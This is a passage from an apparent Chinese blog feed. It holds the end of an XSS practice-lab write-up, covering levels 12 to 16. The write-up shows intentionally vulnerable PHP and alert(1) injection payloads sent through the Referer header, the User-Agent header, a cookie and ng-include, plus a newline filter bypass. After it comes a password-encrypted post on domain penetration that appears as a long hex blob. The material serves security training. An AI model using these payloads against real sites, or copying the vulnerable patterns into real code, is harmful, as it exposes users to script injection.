align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure><p>显然只能从$str11&#x3D;$_SERVER[‘HTTP_REFERER’];入手了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; onclick=&quot;</span>alert(1)<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/5b21026d4fe64dc3b9d202bed10d8aca.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/090010df24fb445aabb38716200d0530.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>- Pass-12</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, 0);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];<br><span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/ea506e57dc6a4c3e97bfcc0640231bb0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>这个就是从user-agent入手</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; onclick=&quot;</span>alert(1)<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/068fbadd64c740f7950f0a81517eb734.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>- Pass-13</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp">&lt;?<span class="hljs-function">php </span><br><span class="hljs-function"><span class="hljs-title">setcookie</span><span class="hljs-params">(<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;call me maybe?&quot;</span>, time()+<span class="hljs-number">3600</span>)</span></span>;<br><span class="hljs-built_in">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br>$str = $_GET[<span class="hljs-string">&quot;keyword&quot;</span>];<br>$str00 = $_GET[<span class="hljs-string">&quot;t_sort&quot;</span>];<br>$str11=$_COOKIE[<span class="hljs-string">&quot;user&quot;</span>];<br>$str22=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str11);<br>$str33=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str22);<br>echo <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-built_in">htmlspecialchars</span>($str).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span><span class="hljs-number">.&#x27;</span>&lt;center&gt;<br>&lt;form id=search&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_link&quot;</span>  value=<span class="hljs-string">&quot;&#x27;.&#x27;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_history&quot;</span>  value=<span class="hljs-string">&quot;&#x27;.&#x27;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_sort&quot;</span>  value=<span class="hljs-string">&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_cook&quot;</span>  value=<span class="hljs-string">&quot;&#x27;.$str33.&#x27;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>cookie注入点</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">user= <span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; onclick=&quot;</span><span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/c9ce0f435ae54d20b4ea6bb8db3e0f8f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>- Pass-14</strong><br>略<br><strong>- Pass-15</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp">&lt;?<span class="hljs-function">php </span><br><span class="hljs-function"><span class="hljs-title">ini_set</span><span class="hljs-params">(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>)</span></span>;<br>$str = $_GET[<span class="hljs-string">&quot;src&quot;</span>];<br>echo <span class="hljs-string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="hljs-built_in">htmlspecialchars</span>($str)<span class="hljs-number">.&#x27;</span><span class="hljs-string">&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>注入代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&#x27;level1.php?name=&lt;img src=x οnerrοr=alert(1)&gt;&#x27;</span><br></code></pre></td></tr></table></figure><p>因为这里要访问上面的angular.min.js这个js文件，才能进行包含，虚拟环境里面无法访问那个js，因为需要fanqiang才能访问<br>ng-include：相当于文件包含。用于包含外部的HTML文件，可以作为一个属性，或者一个元素使用</p><p>onerror:<br>οnerrοr&#x3D;handleErr</p><p>function handleErr(msg,url,l)<br>{<br>&#x2F;&#x2F;Handle the error here<br>return true or false<br>}</p><p><strong>- Pass-16</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp">&lt;?<span class="hljs-function">php </span><br><span class="hljs-function"><span class="hljs-title">ini_set</span><span class="hljs-params">(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>)</span></span>;<br>$str = <span class="hljs-built_in">strtolower</span>($_GET[<span class="hljs-string">&quot;keyword&quot;</span>]);<br>$str2=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,$str);<br>$str3=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,$str2);<br>$str4=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,$str3);<br>$str5=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,$str4);<br>echo <span class="hljs-string">&quot;&lt;center&gt;&quot;</span>.$str5.<span class="hljs-string">&quot;&lt;/center&gt;&quot;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure><p>换行符%0a（换行）或者%0d（回车）绕过</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">&lt;img%<span class="hljs-number">0</span>asrc=x%<span class="hljs-number">0</span>aonerror=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;<br><span class="hljs-comment">//src=#就会把后面的都注释掉了</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/45754e08ea02455e99be64da3b0c62bc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss靶场练习</tag>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域渗透学习笔记</title>
    <link href="/2022/06/15/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/06/15/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="68a431edc9e9a0f64284d862123ff95f6947193dbf3ab78b2630ee3ad63b395a">2713301b30d54682598aa2e6ff3844e0a14d05ccd6e501645ce574ce59d2a42f63784d17cf4c4a2a0fde4006e9043b8a6175a48ea5d5e85068257ce9ceb894ad9f2cca0e729412cf2f7fc91bcb5060b7d0e0fd95f2a5ec69ded89957e24d2d9bc96655a280f0c664b10016cc6863bd80185b8decf116f22525fbec062b82ed80097e4e706d452a1d814c6633f42931d2037004cee1dec312480a4201f6290eafe45f5bfaec9d326ad2e148b22099905f00a25a3e2f78b5c252b26328ee59969ffeea6e7b94da2c9e00e4e9e2ac74f0b6aea6a01105381877ce83b78ab6998edcbbe9ce3308b77d88a4123bb63c49552cfbcbac2a3844568af6694a08278689e3742f543773d8b8a672689ee6620273eee04b8d2cb04d6395a94e24ec71577b927b26f4bd93a88b89b979a97a24251126fe11439d3a35c781e4713d0adb19b3e9920ff96716c61f7df40921aa71990c3be30e96fce5a2bd349686cf2f010a7fc94e75e9e00635a1eb6f7dc5c0c8a480c04d1823430b621fbfd7bb6bcd809438e5a60fc1bb1e16663fbe0682419844974efc6b27878651624f38b5c42061e95c766ea5f75b4fc22c80063003890ff4332e726760c8f915d2335710c1c4b0e2adb8b8c279460dfcf31edd6113d16c4b45838689e568a02aa1ed802f4543283559e9aad724a750b4a0acd4bb7aaca22002bf777cd57dd7d7e974db60ae123591661cc648b925f194a57bc0a1d3d3f5f1c0adcefca467804e338dc1b31c5a380090bf3e33e8e9b9786092dcf42ef45b671fb0fca38dce88ecb7ad6f0eb739ec97e76817edf5a80f4ae8a44ffac5fab07e62e7cb632bbd63f59a2fe0c9423e65d3b4d615e39970c2443d271e2ef04df29b2c3e75118d8a08fd8de241e54a8e5890ee5259707a3b55f9537b92573d188ea58f984049416b919e4d363ff58adbf3150ea61dc6d38dcf906b7cbcf0d0288b70812f0fac503a93b5026f5807fa9f55b97ba4144291d05e8cf9b280e5497b6cd22ccd7ee53110494e13d5ef9220bcf6815e66fe37f015b0f734d067519f84b4e5541eb0cbba27d50f125717656e400f7e1f0f0f1700d211e108e8815077d93cff92254b59e4b468749bceebfd2d0f3ff65f4d188bf121df1eec786ac75e8b2999a792de247c3adffd9066a2a0ea7545156edd13e2b066240f3f66da40b101cd04932a5775f1f3abeb2b6fc3b0441f9cf0ab1adba2a5a39b638dd66f626f6c4e70518aae26d856cac0ee210b307a76b7825947029449596352d96982196cff6cb77ef1a6fe89d1b4552c8c21f0b65d0e26660a5809823c4dc923908522ec25bdc8fb765c1739e1525dc7ab136e93fc7b1fc10083c71c23c03ae09c9ebbdd82e050c523ca09f8304fba9d6a7fa6acd92c9a00787c4405ab3e09968a4d86138347152404978ad8e3d427150c860aae51432d99e720082a5de9288c395929adc79c396e2abb75fc0f04361dedc638337c08eeac5a07fd905aedd3e5e7afd45d2afbdc482fd14ea957a8176dc4b1917be5b159e9c52d06e1199fc011e0140a3649682f0529c9eeb6e9a9ffd97ed4ba0ac94e480140611ec8c6058a128206c64b46cbb00d906195907374dd4fc3f5c231f73dd19bdc8a51b295a09d805fdb69876091516d045fc2fdbd706471141a682598a10e9c2cd66e2f670ae1346a3e3955e08a254720345b9e90fbcfb460ac97576620eaaf0dde2513f43ec3e6cbb6c5c884a83e4dd3f97a0aadb389826ac3dc0c9aaec901ee0dca9b7a16c17fa06499d5334c0bbc4a7e9aeeab6481650e8fbcd318d4b328f18b88027b85ab9637a9b47903a77347d401a797fe49c5fcd94f66bdddc858dcad5ff8417ea5314568e3324a215ca3755657261671cf86bc7c93b6700bfcdfcabfc1e1f1cde271801bcb778d56f8ef35de7387bd9c7a732593c64550137b42d376146f50f4f10ab6573317af8ded2324e76373df492659bc9842af46d62ef75129e551a052efd1e5c9edcef7a61a9b3ca5e21dc9bc9e83dddce276945b57ba0bb0056e285fd8ff766ddbf56e696a9c6874703d78a05e952aefa4f22187319385b690870fc68e1c18e038ed60a5f0836ec5065df74783cc0cb2f4a2558c7e60b8eb50a54d2f7166a0d8d5aa199f19234b90bc565a496aeb73d379502ab180b91765029bceed28b9e9b6b9cf6ff028fced608bf712a08c8fdd403c52c92381f86f57ea3f49d3585af558bb9b06db67459abc3ee8f94f4bf86c3985b043c1a24052966fea0ea40d29d628961a0d781b6faa1df6fab8dcc64034f20e7f8e41ab5885d0a0182f440b8b36942e572e4673ebe3a3616506d6a81cf34fc01e98311c0a992be5372fce54dd9b68dfc5bf626bb63317d5226e93de1c53536b8ba361c31c483d9fa2c43045050bc0e71610c02793ec107cc9616c6e3610fcd70e5e221443aa0e3e154563227c88c4c4d52008594bf91f234a92fbcb7cb845f15b0d503fda93f6ff705338595d1d0ab39172edb177d7222a4232130370a38357e78efbf60f3201712406a8e118646884c285efdc7e6464f3bacfe53af6298c95def413d1cf813213d0997c98f3f76bacb3c69782f9898d2e3522e920c5ec87220d9ce93e3761f95c8e3b64780fbf30ab1dc00508b72ffabda546a6391882d609a29aa900283d0906f29f698fcad0c7b6abfbd1b1db10d39f95e80aaec44039f3e150d8bf9c0757acb786efe0fa43db4fb19dea85f677ead017763fb8e90f68911426c79c4de7af3c7b77b16dace2164bb48c14a8cb5db975363efe202b7befd5968d4bcf49126eeab4fdde699bf4fefd41d7f5b32902714588338d233ad54ee593ce64d829803e2a898a5bbe4c511564ac122329cd62444613bb8b30f92a23093692306039fa4ac5b42be34bb9a6d16bc9f69d4d7ef0e376a4effe40676be1d589dfd5e4c3cfaec540d10adfff42056578eb99946b55a1c8459eee42a4ffeb197ea9c080d5a1fedadd6295f8fc14037c1627d8971431ab14d2d4e6dbf3bd558a0a1c43e7fe02e7fbe3f244934542d04997c4a14b5dcd681b7546b85110ea4d0393462d4145047b73555eb5590cba02c82d4db018592fd09640ed08754086a191d149b6425b5f57529ebf0da385a98b8c2cad5eb5244a7194e12c9b0c677f7f71b42856a956ffbea4c61c63b120c7c099c730d451ccb8a63d26ae4d03119d22ad74ecf9639b3f8c7d616ac2d46b481b914ccaf15ebc684c514f8d32f726b9e62e0ed37333b5018885194add790630952070dca2590898ea7a3a02cace80302287cb6bacaf03af9326c39bde33b5bd25065dd6d7734d506ee7939ba769dbf7e66940c6c452330be119273593a1fd2d9ab0853fe94991aacf71554730246a65d100c10955e7c0a27b683062543efef62f07ecd359fd6318fa2874569e92aabef550e40fc804fd921fb626338308d31335a65c156786f5f48d435b83c01bebfe730288dc92b9a2e772e97072fd7a083073473a97b5a9c32962074c301e0b389d49e1e9eca0de9544545b9ee8b84b6eb316f4281b2545ba7337cc0de757c68a7a67da3fcacd919d132b6b6718114a8358a53bf7b7edcf4c6d5093254a625fda04e99b7dac7a7c6142c5f86b5ffca5692ce0b3137fa2550dcc3a860b18d4090af0cf1c0fddf6628e75a27cac06d5be62e48fbe5ff61b2dd2464915a11af45bcaf5148186ef2da3010a624bde5f1d014e3f2e0289f90ace031124b5e992e51a407d8febc611bc7c293c0f9471235d07813a96c647b71920e0b379db16eff8b7113aeeee2f2a4fab336a07f46540cc7eb21b5c20cf14939f091e2787cb769df95627d00cee5544769aab26f3b5a9ce0ecee14f6f19c31a716922b408e5a81d7ea4a4b2c601ec0bbc544c0bdec9e1f5a7ff9318bdebe79cc3c4eb17671fba070eb0060ce4e699a4b2e2724761dd25ab01fd43c478d3623e969f4e7e273cec3d4bed576b888015af7c2a249663906bfd08b8fd57eb1a6c6b7a7c12746a4d0784008e0a3e34a7d4a4ea8cb2085d158f577ddd05cb979fe4fd9fa3e2e539eb7da025616d609b7ae49ef98d071c8c134c0ba128cf1f96fa2b044691d9d826b32c15510e394b9e60c53cb38fb7b42ecc2ca469c378089a21f2d5e2dc2c9dfc94a8688413a9ec9d33e08ccfb9c97c6de1b84aea44bfec1c1fa86e2e9d04f8da887699e3e137dbd152a9cb71443bc3d2f00df3f668e8f874991091733e7050f96e180458d2b1521d186025bca1621b4ebd1698d3e9152437875cf8089a54eaa5663d63e93151d96e293b524fa368d88f0333e7994f3e0bd7905c5bc2da3bc47a1cbbb1dc617a37cd60e7662a85cd0b93a43714a8707ef692ac19aeb57f6583d2b97f844fd5a2e57ee94fc8d95b9dc959f296b6dde05536c20e359bc80521ac8baccdde49f453ff478c390055d423f8f13c8bb1797e3b9732e447f116fa022a3f0fe64441a089624a159aea499b6303a49bd8f6900900636ecbc048d8e1beff105d7bef46e82e465c9e2ed86faa08ef31796a2558f8ca15911bb3965920a89f786fc2923dc47b47d1f36db17412e5e8e0f60d48677f7dfdee4f04e5363e3cfa54e4707ba9552d100b107890c1a4c2bd7a598cb8ae92642a14d43a53900af918c3f10f5bed6152068d2b0b2652a79e58501d8aafd4e483d37d31199235dffd5fa98725dc1df6c9369c10dcd766c98b9b201451763fdfd76466b13e8b77bb3e41ef303964315cbd2eba36b005429ec65a62bdeec13c706e6856712a10b0c0fb6e383ab770676f933cc8836a5ca0b3f2c6a9c46d4318fbcea8bea023e64aa2dedc8c68614e6350832dcb7d6d9dee8b03c1013fc962a117e7fb3c210f414f61bb15373db56adc0af1d1119a5b44a7c4777d99eab3cfa3e465210b24d93c03a88d3a5b611dd9c5a644c6727bceb8d05aa6b0c2edfd74f438259168de8114e9835f6c229f24b1012c6111efee0875a6dd4cfa1046fb6b3bf90fa91550010184b012e3b947e4fd55c4ca6a05cd5be90462e2e39df95a91c25488d7ff92a1eba0a7ad2ad388d4a791a1ed73a8a13b412e43cfb34a00bb62d20b52923983cb7d90f7d2c248eac67f4af5ae2ec6a9ba637fd99cc17a5fc2def86ba645cf467619f0129111d523997a270f26cc6e20254c1326f9f1915b8c2a898cd1b8d7546ac0bfe03afa42e69ae72059a1abaf8ff75d264be36929080c9ca2b077e622f7103ee2cc43d522aad6127395275413c2e552c3364db5f4e1f0b00553d31130004310718c0e0ead6d9f560375665b9cb4260b2046cd8cae399dcf63705fb5b9fdfdfadceb27f254734e260807df39c2a2b773567763347417be367a283b058cb7b18ff723bfa1201b9097a9bea889ad5bdd3e1a800018c718ded2460cf37f2c5ec0f009d0d4fe594c96a3022a024d2a2bfd5ca49d866c8a7ed24416feee12d76e701f35ca91777f01569db1cfdbda0f8ccda1edb8c580c0ddea25926874e4b7653f84838a660d4a1b470c23d0f869c2d30e5910eba29ed8352f3c00a011a0bbe4438ceb69a99656eb097a5f06caa9e7339a3aa9245d64cb3dc7d7243dd51ace767e2fb83759891f9c02f2759cfe2137158a04f1c06e01472330c0f24be1959ab310f4c61918e7833d190b9eccacb7b07ad76c8b90e3cf604faab54e87ac2f742207b285cce7227608cc9f8b2cb086c8a5af7d83e69cd5a609d8ec0c0993689c1e96325a2f47448158ab2ff6e7f1947bc9f3dc0e13655b505706e49659050cc4a89dcb4705bb8528a8584bac451285deda7ddaf0d69512737164642358697a817b80193b81a982b497b0f5921eed4331d9b93781b68dbd96b8b00aa6dc396072951be2ba05c10b267f5b2cfbab280f99c86e17162e838fff13d0ff2bf47f0158774c56829bf7144e716449933dd193cecb9b9b155894d6aaa29ec4c1f46606492380874f142d065c05a8487d2bc90b5fd0e9e40f5616eccdff4f228e4853e53648328d6c30f106c2d3c9ecac67574617dc215494bb6f96b7d50e53f32373eaf57b2a0e6fb16c67bd8ee2ac1fb40419a1daa48e54e74d28c9dfb62e60a1d232e32e44c0ee539a7cb94c05b663dc092d64ffc3ea4d19a05a2478869e3d6750180f2c80428c51041c9cf41ba9ddc017cc1712bc141892238787dc9dcd4ec9da8aeda1a9d00880ee5f3ae33add9e7a35218dcd9693dc7890d0f1ef2e331bd35c6c6761af3274da1cc17d15afa456eda975fbd3e5e2f399b2f0beb16670a9e06f349d8998c8d0ffb95a8b1d33f531762cec390ee23b76233aaa47db999912015cff64352d25a557a0d54c2b2c0a5d639f786a6bf779ab8856f7f737052eb7486cadcf8159c54e4a97997f8ebf6bad688d273d73880a713464d8c55b291e03e39de3ff3cafc7c5f7d919196b4a4c5445129249d35e92e44a70d88a6a1edc23f1c876dc2d30c52aed736a615f9367f1aede36bb9f3803534fec25ec42b40b647525f7b40083364b912cdbed16f01f80adf595b80d5debcc25d9b1c61a11705e83c77d2f8d7f6272e5ac8e2f5a6e712c093cf270861bbb4ad8981bb07c59b8280320438171bacaad46f7342953a0411a8da6953feb6edbedd41900821d0dd5908028b9b6aec66172ff36450cfc24a49afae08a8d996f05a0614e4a6ed8b19d50487d8d302548d850482329976e574be1f392b67b1745ed3f8635bcde39f80f85aed1df8eddc20c9d62450ca14469c24d0c85a1371fe0f18336344dfee5691676dd2aacd066f6fbcc689e885e9d1510dd111efa67cead08c1b97a2822057d8c7e37ed227e74578d7c7c7bd5b82c276804d6fd6e2b60e808e6895f6778af5ce9d3a99194ee1e3936313b6e8874a173404197df7cf90b83691908a0910e79929cd8d2f08b5c3fb2c6f027d212f2e02b2845d65710a0bc85b737bd2a8bc479ab421dda867adfd9212278fe6cba44138113e3260445e2ee0b41ee716d73d6db600293b047765bba635e47d6287c9a1600e4884cc2548223321756978fb8cee9309619e87f70e618e348c3aa781bb90b5c932846ba5ab3aff967af2dfe3f8f39e23d75e682cf64cf7012e765af091ad9d711285d0a87f99715d4416d0d84d0c6a8006c6c19c92cb9df876fd49550e951066149e7b097c85a335a9c483be3b5a75e035b3c267c2220a2afca228b6c1307cdb8175b25c8435b71254cad865443e6391b8853fab35650ba2981a155b1a457bf076567bf46dea15dfa4d12f62678043977b750ba168efc687d19fbe410e72aecf6980019773952b0a6be8947a8b49c452436f130d4b9353f0759e4138aacc67f42bfaa3d19b49efcbc7d9ca8bfb86e5e43af2998aba1abdabb08821b6363d11993e23df21ba261331bb64f8e64279b2b1082bc9699b65002057727c7b72473d1e970cbe7782e404ccb19c7ee54c05bbebbc4ed7ebe198f1cb96b9d0b53e8951c789e76e803ad092cee3c2fa731fd2de1090664b8a79bd9e5172f1b3c7e8347d1106432452d0efa4950549b255bce558e232e2374a92900712538e7c32f646896a6939db242c4d8d15845e9572f477c6bc18bec8c9276bcb114d1d0ec8f861c85116e7f77711fb28d95219afabaaa83ab3d8cffa9e73f78b8b83ab3995e3ac03d685afbb9ca2b49ceadedcc4503e68547669cb867ecbc8e9084e4a2e5a34c8b92ce68828dc3dbcaad2d0e66f3652b6106a5bdcc8de25e8578cc4c3aa8742c5ec78eb059d8c4e9e9e6c9dd680f38980f2753b26062b83ac8a5331f099093ea5b18333b74f790ee5ce1cac43491cdb08f1f3c936a290db821a605a47057045af7d0077e0e25636056c37abb070595c781d7e3fedbd0f70d1714cf775820033b595ae1c3da1d69d1584bc3500d726c7bd1494a59fc19678b41e7ad3fce0116c464995038b393e885361e2d8f43d7ddc74ebedd308f8c7b997d9fae6c7f81c024aa3ed634dd2d46b243d18b3993bbfaa79b830c795eab20b9e134a93a20e661de0d9abb8fce346d42c97c2cb0f9f3d63e7ae8c6b60eaba8cf0914f1f9b0a0e02d8fa6919958d09fc19b24e2f23eb2e0cab3f2ffa37f1b2618c22f1c766d3e8e08d6730033c9dd278c8733897221b2116d5e165d2565e3a17178fc1875c0c096122d3abf36d62e121e5d0727bbf7bbd8f059224164d4bfafdffedc9264768a94cef1e3418ccb37e58939421580e390ce575c4cafe426c56ecf3c659e16a3b920bfcb40e1a0c55eed6bede89f30254cca9e12ea9c8d70678c4fa9364bcb8fca89859e3c3a1efe9c80fa76c67574241981fb61918796b48ea25fdacfe111c0d5d75ff339665ad45cd41020e0d5de61449b599e3c1e2db5f4bb830643db70fbff04708ef96076f7f0d94ff6c680f52ae98e390061409084b24edf23101bf63ec04ff60990ad828131e0107e11b483652a3aa94b32787cdad8f67d7d941ca89c8b5b8ec6b2c55ededc37a4e048365d5409ff88af091e1624e8a7b47838cca30a11440b9b5e82806e52562380af9b756fff0b1d65cf4ce01c2e7f8853825d6a85ba722955ccde47a41c27145530353664a111d3d52e35eccd9a9f9ac4d2ead99947c203d5d6238e8fcd5a9b312d66add4608868c9550694109ee43f8b774285e0199eb857